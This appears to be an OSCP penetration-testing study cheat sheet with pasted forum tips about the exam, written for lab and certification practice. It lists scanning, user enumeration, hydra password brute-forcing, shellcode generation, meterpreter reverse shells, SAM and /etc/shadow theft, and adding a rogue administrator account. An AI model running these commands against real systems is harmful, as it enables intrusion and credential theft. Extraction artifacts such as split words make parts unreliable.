@@ -1,0 +1,336 @@
+Scan netw ork for live hosts
+(nmap/zenmap)
+For NMAP –
+ 
+nmap -vv -sP 192.168.0.1-254 -oG hosts_up.txt
+cat hosts_up.txt | grep -i “up”
+ 
+  
+nmap -PN 192.168.9.200-254
+(this will also show open ports for each host)
+ 
+  
+Identify OS
+(nmap/zenmap)
+For NMAP –
+ 
+nmap -O 192.168.0.100 (just OS fingerprint)
+ 
+nmap -A 192.168.9.201 (runs an “aggressive” scan – scan,OS fingerprint, version scan, scripts and traeroute)
+
+Check hosts for services
+(nmap/zenmap)
+For NMAP
+- nmap -sS 192.168.9.254 (TCP)
+- nmap -sU 192.168.9.254 (UDP)
+(Could be better to do this in zenmap and group servers by services)
+ 
+FOR SNMP
+-  snmpwalk -c public -v1 192.168.9.254 1 |grep hrSWRunName|cut -d” ” -f
+ 
+For a known port
+- nmap – p 139 192.168.9.254
+ 
+ 
+DNS Lookups/Hostnames
+ 
+host -l <domain> <dns server>
+e.g. host -l acme.local 192.168.0.220
+
+nmap/zenmap/SNMP)
+Check versions of software/services against milw0rm and security focus)
+ 
+ 
+For NMAP
+- nmap -sV 192.168.9.254
+ 
+ 
+ 
+For SNMP
+snmpenum -t 192.168.0.100 (displays all snmp informations for that server)
+ 
+ 
+For SMTP
+nc -v <mailserver> 25
+- Will give mailserver version. Can also VRFY to find valid usernames/email accounts
+ 
+ 
+Netbios/SMB
+- smb4k (graphical interface – lists shares)
+ 
+- smbserverscan
+
+
+metasploit auxiliary scanner
+./msfconsole
+show
+use scanner/smb/version
+set RHOSTS 192.168.0.1-192.168.0.254
+run
+ 
+ 
+ 
+Enumerate Usernames
+(SNMP/SMTP/SMB[NETBIOS]/Add others here)
+ 
+For SMB
+- nmap -sT -p 445 192.168.9.200-254 -oG smb_results.txt (then grep open sessions)
+(on my machine /root/offsec) ./samrdump.py 192.168.9.201 (results from above)
+ 
+For SNMP
+- nmap -sT -p 161 192.168.9.200/254 -oG snmp_results.txt (then grep)
+- snmpwalk public -v1 192.168.9.201 1 |grep 77.1.2.25 |cut -d” “ -f4
+ 
+For SMTP – (/pentest/enumeration/vrfy)
+- ./smtp_VRFY.py <mailserver IP>
+** NEED TO MAKE THREADED – VERY SLOW 
+
+
+SAMRDUMP.PY – (/pentest/python/impacket-examples/samrdump.py)
+- ./samrdump.py SNMP server
+ 
+*** NAMES.TXT – /pentest/enumeration/vrfy/names.txt ***
+*** OR /pentest/web/wfuzz/wordlists/others/names.txt ***
+ 
+ 
+ 
+ 
+Crack Passwords
+(hydra/THC bruter)
+(need mil-dict.txt from Milw0rm – cracked hashs)
+ 
+FTP – hydra -l <username> -P mil-dic.txt -f <FTP SERVER> ftp -V
+ 
+POP3 – hydra -l <username> -P mil-dict.txt -f <MAIL SERVER> pop3 -V (may need to use -t 15 to limit concurrent connections)
+ 
+SNMP – hydra -P mil-dict.txt -f <SNMP SERVER> -V
+ 
+MS VPN – dos2unix words (whatever word list)
+cat words | thc-pptp-bruter VPN server
+
+
+
+Look for known vulnerable services
+(refer nmap/zenmap output)
+Check versions of software (by either snmp enumeration or nmap/zenmap) against http://www.milw 0rm.com/search.php
+or http://www.securityfocus.com/vulnerabilities or http://w ww.exploit-db.com
+ 
+ 
+ 
+Compile exploit code if possible
+(milw 0rm archive)
+ 
+ 
+cd /pentest/exploits/milw0rm
+cat sploitlist.txt | grep -i [exploit]
+ 
+Some exploits may be written for compilation under Windows, while others for Linux.
+You can identify the environment by inspecting the headers.
+cat exploit | grep “#include”
+ 
+Windows:  process.h, string.h, winbase.h, windows.h, winsock2.h
+Linux:   arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h
+ 
+Grep out Windows headers, to leave only Linux based exploits:
+
+
+8/12www.n1tr0g3n.com/?p=3869
+
+cat sploitlist.txt | grep -i exploit | cut -d ” ” -f1 | xargs grep sys | cut -d “:” -f1 | sort -u
+ 
+LINUX
+ 
+ 
+ 
+ 
+gcc -o dcom 66.c
+./dcom
+ 
+ 
+ 
+WINDOWS
+cd /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe ability.c -lwsock32
+wine ability.exe (to run compiled file)
+ 
+ 
+ 
+ 
+Wireshark Filters
+ 
+ 
+To filter out all traffic for IP 192.168.0.100
+ 
+!(IP.ADDR == 192.168.0.100)
+ 
+ 
+ 
+ 
+FUZZING STEPS – ASH STYLE
+ 
+1.  Determine target application and operating system
+
+
+  Obtain a copy of the application
+3.  Analyse the RFC & communication protocols
+4.  Discover & record crash conditions
+5.  Analyse crash conditions for exploitation opportunities
+Things we need to know
+Which 4 bytes overwrite EIP
+Do we have enough space in buffer for shellcode
+Is this shellcode easily  accessible in memory
+Does the application filter out any characters
+Will we encounter overflow protection mechanisms
+ 
+(*** HANDY – framework3/tools -> nasm_shell.rb => JMP ESP ***)
+ 
+Creating pattern for EIP location
+- framework3/tools -> pattern_create.rb <length> >> Fuzzing_script (will append to the end of the script)
+– then look in ollydbg for pattern (need to reverse it and convert)
+ 
+- pattern_offset.rb <EIP PATTERN>
+– will show byte offset
+ 
+Creating shellcode
+(in framework3)
+./msfpayload |grep -i shell
+ 
+./msfpayload …… o (for options)
+./msfpayload …… c (to create)
+** TAKE NOTE OF SHELLCODE SIZE AND ADJUST FINAL BUFFER TO SUIT **
+ 
+CAN ALSO USE FRAMEWORK2 MSFWEB INTERFACE (super easy)
+ 
+ 
+Finding an exploit
+/pentest/exploits/milw0rm
+grep <exploit> sploitlist.txt
+ 
+ 
+MSFCLI (p243)
+./msfcli
+-o options
+
+
+p payloads
+-t test
+-e exploit
+ 
+MSFCONSOLE
+sessions -l => list created sessions
+sessions -i # => interact with specific session number
+ 
+show options
+ 
+search <string>
+ 
+use exploit/ …..
+set PAYLOAD ….
+ 
+exploit
+ 
+ 
+Meterpreter Payloads (p260)
+payload = windows/meterpreter/reverse_tcp ….
+ 
+meterpreter> help (lists all commands)
+ 
+upload <file> c:\\w indows
+ 
+download c:\\windows\\repair\\sam /tmp
+ 
+ps (running tasks)
+ 
+execute -f cmd -c (creates a new channel with the cmd shell)
+interact # (interacts with channel)
+ 
+ 
+Other useful windows commands
+net user ash my_password /add
+net localgroup administrators ash /add
+ 
+ 
+Passwords & Hashes
+Windows SAM => %systemroot%\Repair
+(pw dump or fgdump – p340)
+
+12/30/12 A nice OSCP cheat sheet |
+11/12www.n1tr0g3n.com/?p=3869
+
+*
+*
+
+ 
+or use framework meterpreter shell => gethashes
+ 
+Linux => /etc/passwd & /etc/shadow
+ 
+ 
+John The Ripper
+for linux => unshadow passwd & shadow file to another file
+ 
+./john hashes.txt
+
+http://www.fuzzysecurity.com/tutorials/16.html
+http://pentestmonkey.net/category/cheat-sheet/shell
+https://github.com/GDSSecurity/Windows-Exploit-Suggester
+https://github.com/PenturaLabs/Linux_Exploit_Suggester
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+http://www.offensive-security.com/metasploit-unleashed/Main_Page
+
+As you learn new information, record the information on a cheat sheet. Organize your cheat sheet by category 
+(e.g., enumeration tool commands organized by tool, exploit tool commands organized by tool name, SQL injection cheats organized by database, etc.). 
+Trust me, a tailored cheat sheet will prove invaluable during the OSCP challenge.
+
+
+When you root a box and get the proof.txt flag, resist the urge to move on to the next one right away. There are many that you won't get without thorough post-exploitation enumeration. Do a packet capture on each one. If you're not already familiar, learn how to use tcpdump to capture. On Windows there's a portable version of Wireshark here: https://www.wireshark.org/download.html
+An example is where you scan an IP and only port 3389 is open and you are unable to brute force the password. If you've saved a packet capture from all of the machines you've hacked, look through them and make a note of where you see an arp request or get request from that machine. If you see a get request from that firewalled workstation, you'll know where to be ready with a client side exploit.
+Also, thorough post exploitation enumeration will reveal important details in text files and source code.
+By all means use Metasploit (and Empire) in the labs, but don't become dependent on Metasploit because it's use will be very limited in the exam. If you crack a lab machine with Metasploit, before the exam review and find a way to do it again without it.
+It also helps to form an online study group with others going through the course at the same time. While you shouldn't be giving each other too much help, the occasional hints and motivation goes a long way. I checked with the OffSec staff and they allow study groups but discourage it. You absolutely can't help each other in the exam, but it's accepted in the labs. At least it was last year when I did PWK/OSCP.
+
+
+You can exploit any system you can with Metasploit but in the end you still need to find the public exploit matching that and exploit it manually. I almost screwed up at the end after panicking because I realized I use Metasploit more than once and I needed to find the public exploit for points to pass.
+Also, if you use a public exploit, you can later put a meterpreter shell on it as long as you didn't use Metasploit itself (a payload) to exploit it automatically.
+Just remember to enumerate, enumerate, enumerate.
+
+Here's the exam format:
+5 Boxes
+(1) 25 point BO. Familiarize yourself with writing a custom BO. Can practice on lab box sherlock.
+(3) Other boxes - focus on first getting local access, then worry about privilege escalation.
+(1) 10 point box. This box is your "metasploit box". This should be exploited simply with a MS module. Often times can be done with a simple exploit-db script.
+If you focus on the BO and the 10 point box, plus have >10 lab box writeups (5 points) and all the exercise writeups (5 points), you're already at 25 + 10 + 10 = 45/70 points for the exam. You can typically do that in the first hour of the exam, while running scans on the other three boxes. That's how I'd approach your next one.
+
+Any tips for recognizing which is BO box?
+Is it obvious from the scans?
+Yes, they give you a test box with the same OS and the vulnerable software running so you can craft your exploit.
+For example, if the software is an FTP service with a buffer overflow vulnerability that runs on Windows Server 2003 then when you begin your exam they will give you a windows 2003 virtual machine with the FTP software and a debugger so you can craft and test an exploit. At least, this is how it was set up when I took my exam a few years ago, but I believe this is still the case.
+
+X.X.X.111 and X.X.X.112
+One will be a 'practice' box and one will be the one worth 25 points. Basically each time you attempt the Buffer Overflow (BO), you'll crash the service. Since you have access to the practice box, you can just restart it. This is preferred over testing against the actual box, because you'd need to use one of your resets to fix that.
+Once you exploit the practice box, you'll simply apply the same principle to the actual box.
+
+DEP/ASLR/stack canaries are part of the OSCE, so it's a basic overflow.
+
+Portscans tcp, udp (you have enough time to do all tcp ports, and the most common udp)
+banners & service versioning - take you time to identify the software your up against (most forget this step)
+research common weaknesses cves, exploit-db
+web apps 1st thing - always read the source
+web apps continued - try sql bypass, sql detection strings, check for LFI, when is an LFI an RFI? try different encodings.
+just like the labs always run nikto, and dirb : you never know what they'll throw up, hidden directory, hidden app? hint? etc?
+Marking is a hint on the complexity
+25 marks - your going to spend a lot of time here, probably a staged attempt at getting root here?
+5 - 10 marks - its going to be something quick and simple - do your network mapping and enumeration to figure out what your up against
+
+So as you know the test and the type of machines they will have, you can see that they all come from a large list of possible machines to exploit. You also should have noticed systems that were 'worth' more than others and certain sections in the videos that you needed to learn to get the difficult machine(s). You are also limited with what you can use too so you should know what you are weak on and what you need to study more with.
+You may have just got a hard set of machines this time so don't fret, just reboot, study up a little bit, watch the videos again, and try harder again.
+Did you fail it hard or did you miss it by close margin? When you look at the buffer overflow section in the videos, repeat their exact same steps over and over and over x50 until you can do it in your sleep. With other systems, just remember that enumeration is key. Enumerate the f!@# out of those systems until the answer becomes evident. Do full port scans (all 65K ports) in nmap, look at all web applications running - their directories/files that may be hidden, etc. Understand what service are running, versions that are running for that and research what 'may' be vulnerable for them. If you can get a local account foothold on a system, see how you can escalate yourself to root, etc. Additionally with web services, look at the source code and ask yourself if that is normal, etc. There is a reason it is 24 hours long so pace yourself and be thorough.
+Before the test time, eat some good protein to get the brain working (have less carbs as it will slow your brain down) and get plenty of red bull.
+
+ they changed the videos during the PWB, to PWK in regards to the BO section. I actually thought the PWB BO was easier to follow than the PWK one. Just keep going over it again and again. I literally wrote down every word the guy said and kept trying it on my side until I could do it myself with the same exploit and without the help of the video. You know exactly what you need to do for getting it. Create your skeleton script and go from there. Remember for local user privilege escalation, you need to look at everything. Databases with possible default passwords, services running, and the type of local OS (type it is). You might find a local exploit in Exploit-DB that matches your OS that is running. If you are on linux, do a (uname -a) to see.
+ 
+ Which VulnHub VMs are most like the OSCP labs/Exam?
+ The Kioptrix 1-5 VM's are closely similar to what the OSCP Labs are going to be like. At the same time the SickOS and Tr0ll VM's are also very similar to the labs section.
+ "site:vulnhub.com oscp" brings up a few. Most notably SickOS, Lord of the Root, and Tr0ll (which you mentioned). Other than that, I'm not sure.
+ Damn Vulnerable Web Application Kevgir Kioptrix Level 1 Kioptrix Level 1.1 Kioptrix Level 1.2 Kioprtix Level 1.3 Kioptrix 2014 Lord Of The Root 1.0.1 Pegasus SickOs 1.1 ***** 1 ***** 2
+ 
